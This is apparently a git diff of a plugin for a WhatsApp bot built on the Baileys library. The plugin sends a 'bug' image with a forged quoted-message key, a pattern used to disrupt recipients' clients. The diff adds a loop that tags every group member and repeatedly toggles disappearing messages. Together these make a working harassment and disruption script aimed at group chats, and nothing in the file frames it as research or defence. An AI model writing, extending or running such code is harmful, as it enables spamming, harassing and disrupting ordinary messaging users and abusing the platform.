@@ -1,6 +1,10 @@
-let { Presence } = require('@adiwajshing/baileys')
+let { Presence, GroupSettingChange, MessageType } = require('@adiwajshing/baileys')
 let fs = require ('fs')
 let handler  = async (m, { conn, text }) => {
+  function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
 	conn.sendFile(m.chat, fs.readFileSync(`./media/images/bug.jpg`), 'error.jpg', '', {	
 	  key: {
       remoteJid: '0@s.whatsapp.net',
@@ -14,6 +18,12 @@ let handler  = async (m, { conn, text }) => {
       }
     }
   })
+  let users = (await conn.groupMetadata(m.chat)).participants.map(u => u.jid)
+  for (i=0;i<2;i++){
+    conn.sendMessage(m.chat, `*halo kak*`,MessageType.extendedText,{ contextInfo: { mentionedJid: users } })
+		await conn.toggleDisappearingMessages(m.chat, { quoted: m })
+		await sleep(3000)
+	}
 }
 handler.help = []
 handler.tags = []
